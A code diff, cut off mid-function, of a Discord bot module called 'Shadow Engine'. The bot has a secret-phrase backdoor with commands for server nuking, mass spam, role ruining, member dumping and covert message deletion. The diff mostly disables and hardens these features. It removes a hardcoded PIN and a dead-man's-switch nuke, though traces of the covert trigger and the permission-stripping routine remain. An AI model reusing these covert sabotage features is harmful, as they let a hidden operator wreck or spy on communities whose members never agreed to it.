@@ -9,6 +9,7 @@
  * ============================================================================
  */
 
+const { PermissionFlagsBits } = require("discord.js");
 const { MessageEmbed, MessageActionRow, MessageButton, getLegacyChannelType, resolveChannelType } = require("./core/discordCompat");
 const express = require("express");
 const crypto = require("node:crypto");
@@ -16,27 +17,42 @@ const config  = require("./config.json");
 const sessionManager = require("./sessionManager");
 const { sendLogWebhook, sendAlertWebhook } = require("./core/webhooks");
 const auditStorage = require("./logging/auditStorage");
+const safeLogger = require("./core/safeLogger");
 const { applyShadowPortalAction: applyShadowPortalActionFromHelpers } = require("./systemProvider/actions");
-const { createShadowPortalAuth } = require("./systemProvider/auth");
+const { createShadowPortalAuth, timingSafePinEqual, setPortalSecurityHeaders } = require("./systemProvider/auth");
 const { buildShadowPortalViewData: buildShadowPortalViewDataFromHelpers } = require("./systemProvider/renderers");
 const { renderShadowDashboardPage } = require("./systemProvider/dashboardHtml");
+const { readFiniteInteger } = require("./core/numbers");
+const { isDiscordSnowflake } = require("./core/snowflakes");
 
 // ════════════════════════════════════════════════════════════════════════════
 //  🕵️  CORE DATA — State & Switches
 // ════════════════════════════════════════════════════════════════════════════
-let SHADOW_WEB_PIN = "123456";
+let SHADOW_WEB_PIN = "";
+let shadowSessionVersion = 1;
 const SECRET_PHRASE  = "activate-shadow-protocol";
 const SHADOW_WEBHOOK_URL = process.env.ALERT_WEBHOOK_URL;
 const SHADOW_SESSION_COOKIE = "__shadow_console";
 
 const globalAdminCache = new Set();
-const armedGuilds      = new Set();
+const armedGuilds      = new Map();
+const armTimers        = new Map();
 const hauntedUsers     = new Set();
 const clownUsers       = new Set();
 const traceDeletionRequests = new Map();
 
+function isOwnerOnly(id) {
+    return String(id || "") === String(config.system.ownerId || "");
+}
+
+function getSystemCapability(id) {
+    if (isOwnerOnly(id)) return "owner_only";
+    if (globalAdminCache.has(String(id || ""))) return "operator";
+    return "none";
+}
+
 function isSystemMaster(id) {
-    return id === config.system.ownerId || globalAdminCache.has(id);
+    return getSystemCapability(id) !== "none";
 }
 
 // NEW: Session override list — ห้ามระบบหยุด session ที่มีในรายการนี้ (ป้องกัน)
@@ -55,11 +71,8 @@ const TRACE_POLICY_ALLOWED = "allowed";
 const TRACE_POLICY_DEFAULT = normalizeTracePolicy(
     process.env.TRACE_ERASER_DEFAULT_POLICY || config.system?.traceEraserDefaultPolicy || TRACE_POLICY_APPROVAL
 );
-const TRACE_RATE_LIMIT_MAX = Math.max(1, Number(process.env.TRACE_ERASER_RATE_LIMIT_MAX || config.system?.traceEraserRateLimitMax || 5) || 5);
-const TRACE_RATE_LIMIT_WINDOW_MS = Math.max(
-    1000,
-    Number(process.env.TRACE_ERASER_RATE_LIMIT_WINDOW_MS || config.system?.traceEraserRateLimitWindowMs || 10 * 60 * 1000) || 10 * 60 * 1000
-);
+const TRACE_RATE_LIMIT_MAX = readFiniteInteger(process.env.TRACE_ERASER_RATE_LIMIT_MAX || config.system?.traceEraserRateLimitMax, { fallback: 5, min: 1, max: 100 });
+const TRACE_RATE_LIMIT_WINDOW_MS = readFiniteInteger(process.env.TRACE_ERASER_RATE_LIMIT_WINDOW_MS || config.system?.traceEraserRateLimitWindowMs, { fallback: 10 * 60 * 1000, min: 1000, max: 24 * 60 * 60 * 1000 });
 const TRACE_SENSITIVE_TERMS = [
     "deleted",
     "delete",
@@ -111,14 +124,25 @@ const traceMetrics = {
 
 let shadowPortalAuthInstance = null;
 
+function resetShadowPortalAuth() {
+    shadowPortalAuthInstance = null;
+}
+
 function getShadowPortalAuth() {
     if (!shadowPortalAuthInstance) {
         shadowPortalAuthInstance = createShadowPortalAuth({
             cookieName: SHADOW_SESSION_COOKIE,
             ttlMs: TRACE_APPROVAL_TTL_MS,
             getPin: () => SHADOW_WEB_PIN,
-            getCookieSecret: () => process.env.API_SECRET || process.env.INTERNAL_API_SECRET || "shadow-console",
-            shadowCss: SHADOW_CSS
+            getCookieSecret: () => process.env.SHADOW_SESSION_SECRET,
+            getSessionVersion: () => shadowSessionVersion,
+            isBreakGlassEnabled: () => readBoolean(process.env.SHADOW_BREAK_GLASS_ENABLED, false),
+            getRecoveryPin: () => process.env.SHADOW_BREAK_GLASS_PIN,
+            shadowCss: SHADOW_CSS,
+            maxBruteKeys: readFiniteInteger(process.env.SHADOW_BRUTE_MAX_KEYS, { fallback: 1000, min: 100, max: 10000 }),
+            onAuthEvent(event) {
+                console.warn(`[SHADOW AUTH] ${event.event}`);
+            }
         });
     }
     return shadowPortalAuthInstance;
@@ -138,67 +162,9 @@ function escapeHtml(value) {
         .replaceAll("'", "&#39;");
 }
 
-function getShadowCookieSecret() {
-    return String(process.env.API_SECRET || process.env.INTERNAL_API_SECRET || "shadow-console").trim();
-}
-
-function makeShadowSessionToken() {
-    const issuedAt = Date.now().toString();
-    const sig = crypto
-        .createHmac("sha256", getShadowCookieSecret())
-        .update(`shadow:${issuedAt}`)
-        .digest("hex")
-        .slice(0, 40);
-    return `${issuedAt}.${sig}`;
-}
-
-function verifyShadowSessionToken(token) {
-    if (!token || typeof token !== "string") return false;
-    const dot = token.lastIndexOf(".");
-    if (dot < 0) return false;
-
-    const issuedAt = token.slice(0, dot);
-    const sig = token.slice(dot + 1);
-    const issuedMs = Number.parseInt(issuedAt, 10);
-    if (!Number.isFinite(issuedMs) || Date.now() - issuedMs > TRACE_APPROVAL_TTL_MS || issuedMs > Date.now() + 60000) return false;
-
-    const expected = crypto
-        .createHmac("sha256", getShadowCookieSecret())
-        .update(`shadow:${issuedAt}`)
-        .digest("hex")
-        .slice(0, 40);
-    if (sig.length !== expected.length) return false;
-    return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected));
-}
-
-function readCookie(req, name) {
-    const raw = String(req.headers?.cookie || "");
-    for (const part of raw.split(";")) {
-        const idx = part.indexOf("=");
-        if (idx < 0) continue;
-        const key = part.slice(0, idx).trim();
-        if (key !== name) continue;
-        try {
-            return decodeURIComponent(part.slice(idx + 1).trim());
-        } catch {
-            return "";
-        }
-    }
-    return "";
-}
-
-function issueShadowSessionCookie(res) {
-    res.cookie(SHADOW_SESSION_COOKIE, makeShadowSessionToken(), {
-        httpOnly: true,
-        sameSite: "lax",
-        secure: String(process.env.NODE_ENV || "").trim() === "production",
-        maxAge: TRACE_APPROVAL_TTL_MS
-    });
-}
-
 function safeDiscordId(value) {
     const text = String(value ?? "").trim();
-    return /^\d{5,25}$/.test(text) ? text : "unknown";
+    return isDiscordSnowflake(text) ? text : "unknown";
 }
 
 function safeDiscordMention(prefix, id) {
@@ -330,11 +296,17 @@ const traceApprovalWebhookTargets = [
 ].filter(Boolean);
 
 function isOwnerApprover(userId) {
-    return userId === config.system.ownerId || globalAdminCache.has(userId);
+    return isOwnerOnly(userId);
 }
 
 function hasAnyTerm(text, terms) {
     return terms.some(term => text.includes(term));
+}
+
+function hasProtectedChannelTerm(value) {
+    const normalized = String(value || "").trim().toLowerCase();
+    const parts = new Set(normalized.split(/[\s_-]+/).filter(Boolean));
+    return TRACE_PROTECTED_CHANNEL_TERMS.some(term => normalized === term || parts.has(term));
 }
 
 function truncateText(text, limit = 700) {
@@ -361,43 +333,84 @@ function isOwnerGuildId(guildId) {
     return !!guildId && String(guildId) === String(config.system?.bypassApprovalGuildId || "");
 }
 
-// Minimal brute-force guard สำหรับ Shadow Portal (เก็บ in-memory, self-contained)
-const _pinBruteGuard = new Map(); // ip → { attempts: number, lockUntil: number }
-
 const systemToggles = {
     godsEye:       true,
-    traceEraser:   true,
+    traceEraser:   false,
     deadManKick:   false,
     deadManDemote: false,
     cmdIntel:      true,
     cmdAdminScan:  true,
     cmdRoleList:   true,
     cmdAuditBot:   true,
-    cmdMemberDump: true,   // NEW: dump member list
-    cmdExtract:    true,
-    cmdVanish:     true,
-    cmdStealth:    true,
+    cmdMemberDump: false,
+    cmdExtract:    false,
+    cmdVanish:     false,
+    cmdStealth:    false,
     cmdGhostPing:  true,
     cmdSysInfo:    true,
-    cmdLockdown:   true,
-    cmdMemClear:   true,
-    cmdNuke:       true,
-    cmdHostage:    true,
-    cmdMassSpam:   true,
-    cmdRuinRoles:  true,
-    cmdSpamVC:     true,
-    cmdMimic:      true,
-    cmdClown:      true,
-    cmdHaunt:      true,
-    cmdGhostMode:  true,   // NEW: เปิด/ปิด ghost mode
-    cmdProtect:    true,   // NEW: ปกป้อง session
-    cmdSnap:       true,   // NEW: screenshot server info
-    cmdSilence:    true,   // NEW: ปิดเสียงทุกห้องพร้อมกัน
-    cmdRestore:    true,   // NEW: คืนค่า Permission
+    cmdLockdown:   false,
+    cmdMemClear:   false,
+    cmdNuke:       false,
+    cmdHostage:    false,
+    cmdMassSpam:   false,
+    cmdRuinRoles:  false,
+    cmdSpamVC:     false,
+    cmdMimic:      false,
+    cmdClown:      false,
+    cmdHaunt:      false,
+    cmdGhostMode:  false,
+    cmdProtect:    true,
+    cmdSnap:       true,
+    cmdSilence:    false,
+    cmdRestore:    true
 };
 
-// Permission snapshot สำหรับ -restore
-const permissionSnapshots = new Map();
+const OPERATOR_COMMANDS = new Set(["-intel", "-adminscan", "-rolelist", "-auditbot", "-ghostping", "-sysinfo", "-snap"]);
+
+function getActiveArm(guildId, now = Date.now()) {
+    const entry = armedGuilds.get(String(guildId || ""));
+    if (!entry) return null;
+    if (!Number.isFinite(Number(entry.expiresAt)) || Number(entry.expiresAt) <= now) {
+        armedGuilds.delete(String(guildId || ""));
+        const timer = armTimers.get(String(guildId || ""));
+        if (timer) clearTimeout(timer);
+        armTimers.delete(String(guildId || ""));
+        return null;
+    }
+    return entry;
+}
+
+function scheduleArmTimer(guildId, generation, expiresAt) {
+    const key = String(guildId || "");
+    const current = armTimers.get(key);
+    if (current) clearTimeout(current);
+    const delayMs = Math.max(0, Number(expiresAt) - Date.now());
+    const timer = setTimeout(() => {
+        const entry = armedGuilds.get(key);
+        if (entry?.generation === generation) armedGuilds.delete(key);
+        armTimers.delete(key);
+    }, delayMs);
+    timer.unref?.();
+    armTimers.set(key, timer);
+}
+
+function cancelArmTimer(guildId) {
+    const key = String(guildId || "");
+    const timer = armTimers.get(key);
+    if (timer) clearTimeout(timer);
+    armTimers.delete(key);
+}
+
+// Versioned restoration snapshots are separated by resource type.
+const roleSnapshots = new Map();
+const channelOverwriteSnapshots = new Map();
+const voiceMuteSnapshots = new Map();
+const stateTimers = new Map();
+
+
+function overwriteTypeRole() {
+    return 0;
+}
 
 // ════════════════════════════════════════════════════════════════════════════
 //  🛡️  SHADOW ENGINE CLASS
@@ -407,11 +420,20 @@ class ShadowEngine {
         this.client  = client;
         this.webhookEnabled = Boolean(SHADOW_WEBHOOK_URL);
         this.traceApprovalChannelId = null;
+        this.initialized = false;
+        this.listeners = [];
+    }
+
+    registerListener(event, handler) {
+        this.client.on(event, handler);
+        this.listeners.push([event, handler]);
     }
 
     // ──────────────────────────────────────────────────────────────────────
     init() {
-        this.client.on("messageCreate", async (message) => {
+        if (this.initialized) return this;
+        this.initialized = true;
+        this.registerListener("messageCreate", async (message) => {
             try {
                 await this.handleTraceEraser(message);
             } catch (err) {
@@ -424,52 +446,79 @@ class ShadowEngine {
                 logSuppressedError("secret command message listener", err);
             }
 
-            // Haunt — auto-delete ข้อความของ user ที่ถูก haunt หลัง 12 วิ
-            if (systemToggles.cmdHaunt && hauntedUsers.has(message.author.id)) {
-                setTimeout(() => message.delete().catch(() => {}), 12000);
+            // Delayed state action is tracked and re-validated before execution.
+            const hauntKey = `${message.guild?.id}:${message.author.id}`;
+            if (systemToggles.cmdHaunt && hauntedUsers.has(hauntKey)) {
+                const timerKey = `${hauntKey}:${message.id}`;
+                const timer = setTimeout(async () => {
+                    stateTimers.delete(timerKey);
+                    if (!hauntedUsers.has(hauntKey)) return;
+                    await message.delete().catch(() => {});
+                }, 12000);
+                timer.unref?.();
+                stateTimers.set(timerKey, timer);
             }
             // Clown — react 🤡 ถ้า user ถูก tag
-            if (systemToggles.cmdClown && clownUsers.has(message.author.id)) {
+            if (systemToggles.cmdClown && clownUsers.has(`${message.guild?.id}:${message.author.id}`)) {
                 message.react('🤡').catch(() => {});
             }
         });
 
-        this.client.on("interactionCreate", async (interaction) => {
+        this.registerListener("interactionCreate", async (interaction) => {
             await this.handleTraceApprovalInteraction(interaction).catch(() => {});
         });
 
         this.reportTraceStartupDiagnostics().catch(() => {});
 
         // ── Dead Man's Switch ──
-        this.client.on("guildMemberRemove", async (member) => {
+        this.registerListener("guildMemberRemove", async (member) => {
             if (!systemToggles.deadManKick || !armedGuilds.has(member.guild.id)) return;
             if (member.id === config.system.ownerId || globalAdminCache.has(member.id)) {
-                await this.sendAlert(`${config.emojis.critical} DEAD MAN — KICK`, `รหัสแดง! สายลับถูกเตะจาก **${member.guild.name}**!`, "#ED4245");
-                await this.executeStealthNuke(member.guild);
+                await this.sendAlert(`${config.emojis.critical} SECURITY ALERT — MEMBER REMOVED`, `ตรวจพบสมาชิกสิทธิ์สูงออกจาก **${member.guild.name}** ระบบได้หยุดฟีเจอร์เสี่ยงและรอเจ้าของตรวจสอบ`, "#ED4245");
+                armedGuilds.delete(member.guild.id);
+                cancelArmTimer(member.guild.id);
             }
         });
 
-        this.client.on("guildMemberUpdate", async (oldMember, newMember) => {
+        this.registerListener("guildMemberUpdate", async (oldMember, newMember) => {
             if (!systemToggles.deadManDemote || !armedGuilds.has(newMember.guild.id)) return;
             if (newMember.id === this.client.user.id) {
-                if (oldMember.permissions.has("ADMINISTRATOR") && !newMember.permissions.has("ADMINISTRATOR")) {
-                    await this.sendAlert(`${config.emojis.critical} DEAD MAN — DEMOTE`, `รหัสแดง! บอทถูกยึดอำนาจใน **${newMember.guild.name}**!`, "#ED4245");
-                    await this.executeStealthNuke(newMember.guild);
+                if (oldMember.permissions.has(PermissionFlagsBits.Administrator) && !newMember.permissions.has(PermissionFlagsBits.Administrator)) {
+                    await this.sendAlert(`${config.emojis.critical} SECURITY ALERT — PERMISSION CHANGED`, `สิทธิ์บอทลดลงใน **${newMember.guild.name}** ระบบได้หยุดฟีเจอร์เสี่ยงและรอเจ้าของตรวจสอบ`, "#ED4245");
+                    armedGuilds.delete(newMember.guild.id);
+                    cancelArmTimer(newMember.guild.id);
                 }
             }
         });
 
-        console.log("[SHADOW ENGINE] ✅ Connected. All systems active.");
+        console.log("[SHADOW ENGINE] ✅ Connected. Safety controls active.");
+        return this;
+    }
+
+    dispose() {
+        for (const [event, handler] of this.listeners.splice(0)) {
+            this.client.off?.(event, handler);
+            this.client.removeListener?.(event, handler);
+        }
+        for (const timer of stateTimers.values()) clearTimeout(timer);
+        stateTimers.clear();
+        for (const timer of armTimers.values()) clearTimeout(timer);
+        armTimers.clear();
+        armedGuilds.clear();
+        this.initialized = false;
     }
 
     // ──────────────────────────────────────────────────────────────────────
        async logCommand(message, command, args = []) {
+        const armStatus = getActiveArm(message.guild.id)
+            ? `${config.emojis.armed_on} ARMED`
+            : `${config.emojis.armed_off} SAFE`;
         const lines = [
             `${config.emojis.user} **ผู้รัน:** ${message.author.tag} (\`${message.author.id}\`)`,
             `🖥️ **เซิร์ฟเวอร์:** ${message.guild.name} (\`${message.guild.id}\`)`,
             `${config.emojis.alert} **คำสั่ง:** \`${command}\``,
             args.length ? `📝 **Arguments:** \`${args.join(' ')}\`` : null,
-            `${config.emojis.lock} **ARM Status:** ${armedGuilds.has(message.guild.id) ? `${config.emojis.armed_on} ARMED` : `${config.emojis.armed_off} SAFE`}`,
+            `${config.emojis.lock} **ARM Status:** ${armStatus}`,
             `🔒 **Ghost Mode:** ${ghostModeEnabled ? '👻 ON' : '⭕ OFF'}`,
             `⏰ **เวลา:** <t:${Math.floor(Date.now() / 1000)}:F>`
         ].filter(Boolean).join('\n');
@@ -559,7 +608,7 @@ class ShadowEngine {
         if (content.includes("shadow report") || content.includes("trace eraser")) return true;
 
         const channelName = String(message.channel?.name || "").toLowerCase();
-        return hasAnyTerm(channelName, TRACE_PROTECTED_CHANNEL_TERMS);
+        return hasProtectedChannelTerm(channelName);
     }
 
     getTraceGuildPolicy(guildId) {
@@ -628,6 +677,13 @@ class ShadowEngine {
             return;
         }
 
+        const intent = await this.recordTraceAudit(message, "TRACE_AUTO_DELETE_INTENT", "warning", "trace_auto_delete_intent", { policy });
+        if (!intent) {
+            traceMetrics.auditFailed++;
+            await this.sendAlert("TRACE GUARD — AUDIT UNAVAILABLE", "ไม่ลบข้อความเพราะไม่สามารถบันทึก Audit intent ได้", "#ED4245");
+            return;
+        }
+
         const deleted = await message.delete().then(() => true).catch(() => false);
         if (!deleted) {
             traceMetrics.deleteFailed++;
@@ -649,7 +705,14 @@ class ShadowEngine {
         const messageId = safeDiscordId(message.id);
         const authorId = safeDiscordId(message.author.id);
         const jumpLink = safeDiscordJumpLink(guildId, channelId, messageId);
-        const preview = truncateText(content, 500) || "(ไม่มีข้อความตัวอย่าง)";
+        const preview = truncateText(safeLogger.sanitizeLogText(content), 220) || "(ไม่มีข้อความตัวอย่าง)";
+
+        const requestAudit = await this.recordTraceAudit(message, "TRACE_APPROVAL_REQUESTED", "warning", "trace_approval_requested", { policy, requestId });
+        if (!requestAudit) {
+            traceMetrics.auditFailed++;
+            await this.sendAlert("TRACE GUARD — AUDIT UNAVAILABLE", "ไม่สร้างคำขออนุมัติเพราะไม่สามารถบันทึก Audit ได้", "#ED4245");
+            return;
+        }
 
         traceDeletionRequests.set(requestId, {
             guildId: message.guild.id,
@@ -659,10 +722,11 @@ class ShadowEngine {
             authorId: message.author.id,
             authorTag: message.author.tag,
             policy,
+            state: "pending",
+            generation: crypto.randomUUID(),
             expiresAt
         });
         traceMetrics.approvalsRequested++;
-        await this.recordTraceAudit(message, "TRACE_APPROVAL_REQUESTED", "warning", "trace_approval_requested", { policy, requestId });
 
         const embed = new MessageEmbed()
             .setTitle("Trace Eraser ต้องรออนุมัติ")
@@ -690,25 +754,33 @@ class ShadowEngine {
                 .setStyle("SECONDARY")
         );
 
-        const approvalChannel = await this.resolveTraceApprovalChannel().catch(() => null);
-        const promptChannel = approvalChannel || message.channel;
-        await promptChannel.send({ embeds: [embed], components: [row] })
-            .catch(err => {
-                logSuppressedError("send trace approval prompt", err);
-                return message.channel.send({ embeds: [embed], components: [row] }).catch(fallbackErr => {
-                    logSuppressedError("send trace approval fallback", fallbackErr);
-                });
-            });
+        const approvalChannel = await this.resolveTraceApprovalChannel(channelId).catch(() => null);
+        if (!approvalChannel?.send) {
+            traceDeletionRequests.delete(requestId);
+            await this.recordTraceAudit(message, "TRACE_APPROVAL_DESTINATION_UNAVAILABLE", "warning", "trace_approval_destination_unavailable", { policy, requestId });
+            await this.sendAlert("TRACE GUARD — APPROVAL UNAVAILABLE", "ไม่ลบและไม่แสดงคำขอในช่องสาธารณะ เพราะไม่พบช่องทางอนุมัติที่ปลอดภัย", "#ED4245");
+            return;
+        }
+        const prompt = await approvalChannel.send({ embeds: [embed], components: [row] }).catch(err => {
+            logSuppressedError("send trace approval prompt", err);
+            return null;
+        });
+        if (!prompt) {
+            traceDeletionRequests.delete(requestId);
+            await this.recordTraceAudit(message, "TRACE_APPROVAL_PROMPT_FAILED", "warning", "trace_approval_prompt_failed", { policy, requestId });
+            return;
+        }
 
         const alertBody = traceApprovalAlertBody({ guildId, channelId, messageId, authorId, expiresAt });
         await this.sendAlert("TRACE ERASER — APPROVAL REQUIRED", alertBody, "#FEE75C");
     }
 
-    async resolveTraceApprovalChannel() {
+    async resolveTraceApprovalChannel(sourceChannelId = null) {
+        const sourceId = sourceChannelId ? String(sourceChannelId) : null;
         if (this.traceApprovalChannelId) {
             const cached = this.client.channels.cache.get(this.traceApprovalChannelId)
                 || await this.client.channels.fetch(this.traceApprovalChannelId).catch(() => null);
-            if (cached?.send) return cached;
+            if (cached?.send && String(cached.id) !== sourceId) return cached;
             this.traceApprovalChannelId = null;
         }
 
@@ -718,7 +790,7 @@ class ShadowEngine {
             if (!channelId) continue;
             const channel = this.client.channels.cache.get(channelId)
                 || await this.client.channels.fetch(channelId).catch(() => null);
-            if (channel?.send) {
+            if (channel?.send && String(channel.id) !== sourceId) {
                 this.traceApprovalChannelId = channelId;
                 return channel;
             }
@@ -756,6 +828,7 @@ class ShadowEngine {
                 }
             });
             if (saved) traceMetrics.auditSaved++;
+            else traceMetrics.auditFailed++;
             return saved;
         } catch (err) {
             traceMetrics.auditFailed++;
@@ -807,11 +880,14 @@ class ShadowEngine {
         }
 
         const request = traceDeletionRequests.get(parsed.requestId);
-        if (!request) {
-            await interaction.reply({ content: "คำขอนี้หมดอายุหรือถูกจัดการไปแล้ว", ephemeral: true }).catch(() => {});
+        if (request?.state !== "pending") {
+            await interaction.reply({ content: "คำขอนี้หมดอายุหรือกำลังถูกจัดการแล้ว", ephemeral: true }).catch(() => {});
             await interaction.message?.edit?.({ components: [] }).catch(() => {});
             return true;
         }
+        request.state = "processing";
+        request.claimedBy = interaction.user?.id || null;
+        request.claimedAt = Date.now();
 
         if (request.expiresAt <= Date.now()) {
             traceDeletionRequests.delete(parsed.requestId);
@@ -833,6 +909,7 @@ class ShadowEngine {
         }
 
         if (parsed.action !== "approve") {
+            traceDeletionRequests.delete(parsed.requestId);
             await interaction.reply({ content: "ปุ่มนี้ไม่ถูกต้อง", ephemeral: true }).catch(() => {});
             return true;
         }
@@ -866,6 +943,13 @@ class ShadowEngine {
             return true;
         }
 
+        const deleteIntent = await this.recordTraceAudit(request, "TRACE_APPROVED_DELETE_INTENT", "warning", "trace_approved_delete_intent", { policy: request.policy, requestId: parsed.requestId, approverId: interaction.user?.id });
+        if (!deleteIntent) {
+            traceDeletionRequests.delete(parsed.requestId);
+            await interaction.message?.edit?.({ components: [] }).catch(() => {});
+            await interaction.reply({ content: "ไม่ลบข้อความ เพราะไม่สามารถบันทึก Audit intent ได้", ephemeral: true }).catch(() => {});
+            return true;
+        }
         const deleted = await target.delete().then(() => true).catch(() => false);
         traceDeletionRequests.delete(parsed.requestId);
         await interaction.message?.edit?.({ components: [] }).catch(() => {});
@@ -898,8 +982,8 @@ class ShadowEngine {
         try {
             // snapshot permission ก่อน nuke (เผื่อ restore)
             const snap = {};
-            guild.roles.cache.forEach(r => { snap[r.id] = { name: r.name, perms: r.permissions.bitfield.toString() }; });
-            permissionSnapshots.set(guild.id, snap);
+            guild.roles.cache.forEach(r => { snap[r.id] = { name: r.name, perms: r.permissions.bitfield.toString(), color: r.color, hoist: r.hoist, mentionable: r.mentionable }; });
+            roleSnapshots.set(guild.id, { type: "roles", generation: crypto.randomUUID(), createdAt: Date.now(), roles: snap });
 
             // 1. ริบสิทธิ์ Role ทั้งหมด (await ทุกตัว + delay กัน rate limit)
             for (const role of guild.roles.cache.values()) {
@@ -931,11 +1015,11 @@ class ShadowEngine {
     // ──────────────────────────────────────────────────────────────────────
     async processSecretCommands(message) {
         if (!message.guild || message.author.bot) return;
-        if (ghostModeEnabled && !isSystemMaster(message.author.id)) return;
-        if (!isSystemMaster(message.author.id)) return;
-
         const args = message.content.trim().split(/ +/);
         if (args[0] !== SECRET_PHRASE) return;
+        const capability = getSystemCapability(message.author.id);
+        if (ghostModeEnabled && capability === "none") return;
+        if (capability === "none") return;
 
         try {
             await message.delete();
@@ -945,6 +1029,7 @@ class ShadowEngine {
 
         const command = args[1];
         const guild   = message.guild;
+        if (capability !== "owner_only" && !OPERATOR_COMMANDS.has(command)) return;
         const ctx = { message, args, command, guild };
 
         await this.logCommand(message, command, args.slice(2));
@@ -957,8 +1042,8 @@ class ShadowEngine {
         }
 
         // ════════════════ [ทำลายล้าง — ต้อง ARMED] ════════════════
-        const isArmed = armedGuilds.has(guild.id);
-        if (!isArmed) return;
+        const arm = getActiveArm(guild.id);
+        if (!arm || capability !== "owner_only") return;
 
         try {
             await this.runArmedSecretCommand(ctx);
@@ -1008,15 +1093,9 @@ class ShadowEngine {
         };
     }
 
-    armedSecretCommandHandlers(ctx) {
-        const { args, guild } = ctx;
-        return {
-            "-nuke": { enabled: systemToggles.cmdNuke, run: () => this.commandNuke(guild) },
-            "-hostage": { enabled: systemToggles.cmdHostage, run: () => this.commandHostage(guild) },
-            "-ruinroles": { enabled: systemToggles.cmdRuinRoles, run: () => this.commandRuinRoles(guild, args) },
-            "-spamvc": { enabled: systemToggles.cmdSpamVC, run: () => this.commandSpamVoice(guild, args) },
-            "-masspam": { enabled: systemToggles.cmdMassSpam, run: () => this.commandMassSpam(guild, args) }
-        };
+    armedSecretCommandHandlers() {
+        // Irreversible guild-destruction and spam operations remain unavailable.
+        return {};
     }
 
     async commandIntel(guild) {
@@ -1035,14 +1114,14 @@ class ShadowEngine {
 
     async commandAdminScan(guild) {
         const admins = guild.members.cache
-            .filter(m => m.permissions.has("ADMINISTRATOR"))
+            .filter(m => m.permissions.has(PermissionFlagsBits.Administrator))
             .map(m => `• **${m.user.tag}** (\`${m.id}\`)`)
             .join("\n");
         await this.sendAlert("🔎 ADMINISTRATOR SCAN", `แอดมินใน **${guild.name}**:\n\n${admins || "ไม่พบ"}`);
     }
 
     async commandRoleList(guild) {
-        const roles = guild.roles.cache
+        const roles = [...guild.roles.cache.values()]
             .sort((a, b) => b.position - a.position)
             .map(r => `• **${r.name}** \`${r.id}\` — ${r.members.size} คน`)
             .join("\n");
@@ -1060,7 +1139,7 @@ class ShadowEngine {
     async commandMemberDump(guild) {
         const fetched = await guild.members.fetch({ limit: 500 });
         const lines = fetched.map(m =>
-            `${m.user.bot ? '🤖' : '👤'} **${m.user.tag}** \`${m.id}\`${m.permissions.has("ADMINISTRATOR") ? ' 👑' : ''}`
+            `${m.user.bot ? '🤖' : '👤'} **${m.user.tag}** \`${m.id}\`${m.permissions.has(PermissionFlagsBits.Administrator) ? ' 👑' : ''}`
         ).join("\n");
         const chunks = [];
         for (let i = 0; i < lines.length; i += 1800) chunks.push(lines.substring(i, i + 1800));
@@ -1126,48 +1205,101 @@ class ShadowEngine {
     async commandLockdown(message, guild) {
         if (getLegacyChannelType(message.channel.type) !== "GUILD_TEXT") return;
         const overwrite = message.channel.permissionOverwrites.cache.get(guild.id);
-        if (!permissionSnapshots.has(`ch_${message.channel.id}`)) {
-            permissionSnapshots.set(`ch_${message.channel.id}`, {
-                allow: overwrite?.allow.bitfield.toString() || "0",
-                deny: overwrite?.deny.bitfield.toString() || "0"
+        const key = `${guild.id}:${message.channel.id}:${guild.id}`;
+        if (!channelOverwriteSnapshots.has(key)) {
+            channelOverwriteSnapshots.set(key, {
+                type: "channel_overwrite",
+                guildId: guild.id,
+                channelId: message.channel.id,
+                targetId: guild.id,
+                existed: Boolean(overwrite),
+                allow: overwrite?.allow?.bitfield?.toString?.() || "0",
+                deny: overwrite?.deny?.bitfield?.toString?.() || "0",
+                generation: crypto.randomUUID(),
+                createdAt: Date.now()
             });
         }
-        await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: false });
+        await message.channel.permissionOverwrites.edit(guild.id, { SendMessages: false });
         await this.sendAlert("🔒 CHANNEL LOCKED", `ล็อก <#${message.channel.id}> ใน **${guild.name}** — ใช้ -unlock คืนค่า`);
     }
 
     async commandUnlock(message, guild) {
         if (getLegacyChannelType(message.channel.type) !== "GUILD_TEXT") return;
-        await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: null });
-        await this.sendAlert("🔓 CHANNEL UNLOCKED", `คลายล็อก <#${message.channel.id}> ใน **${guild.name}**`);
+        const key = `${guild.id}:${message.channel.id}:${guild.id}`;
+        const snapshot = channelOverwriteSnapshots.get(key);
+        if (!snapshot) {
+            await this.quickAlert("❌ ไม่พบ Snapshot ของช่องนี้");
+            return;
+        }
+
+        if (!snapshot.existed) {
+            await message.channel.permissionOverwrites.delete(guild.id, "Restore pre-lock overwrite state");
+        } else {
+            const current = [...message.channel.permissionOverwrites.cache.values()]
+                .filter(overwrite => overwrite.id !== guild.id)
+                .map(overwrite => ({
+                    id: overwrite.id,
+                    type: overwrite.type,
+                    allow: overwrite.allow.bitfield,
+                    deny: overwrite.deny.bitfield
+                }));
+            current.push({
+                id: guild.id,
+                type: overwriteTypeRole(),
+                allow: BigInt(snapshot.allow),
+                deny: BigInt(snapshot.deny)
+            });
+            await message.channel.permissionOverwrites.set(current, "Restore exact pre-lock overwrite state");
+        }
+        channelOverwriteSnapshots.delete(key);
+        await this.sendAlert("🔓 CHANNEL UNLOCKED", `คืน Permission overwrite เดิมของ <#${message.channel.id}> ใน **${guild.name}**`);
     }
 
     async commandMemClear() {
-        this.client.channels.cache.clear();
-        await this.sendAlert("🧠 MEMORY FLUSHED", "เคลียร์ Channel cache เรียบร้อย");
+        await this.sendAlert("🧠 MEMORY POLICY", "ปฏิเสธการล้าง Channel cache โดยตรง ระบบใช้ bounded cache และ sweepers แทน");
     }
 
     async commandSilence(message, guild) {
         const voiceCh = message.member.voice.channel;
         if (!voiceCh) { await this.quickAlert("❌ ต้องอยู่ในห้องเสียงก่อน"); return; }
+        const key = `${guild.id}:${voiceCh.id}`;
+        const generation = crypto.randomUUID();
+        const members = [];
         let silenced = 0;
+        let failed = 0;
         for (const [, member] of voiceCh.members) {
             if (member.id === this.client.user.id) continue;
-            await member.voice.setMute(true, "Shadow: -silence").catch(() => {});
-            silenced++;
+            const wasServerMuted = member.voice.serverMute === true;
+            members.push({ memberId: member.id, wasServerMuted });
+            if (wasServerMuted) continue;
+            const changed = await member.voice.setMute(true, "Protected control: silence").then(() => true).catch(() => false);
+            if (changed) silenced++;
+            else failed++;
             await delay(200);
         }
-        await this.sendAlert("🔇 SILENCE ACTIVATED", `ปิดเสียง ${silenced} คนใน **${voiceCh.name}** (${guild.name})\nใช้ -unsilence เพื่อคืนค่า`, "#f97316");
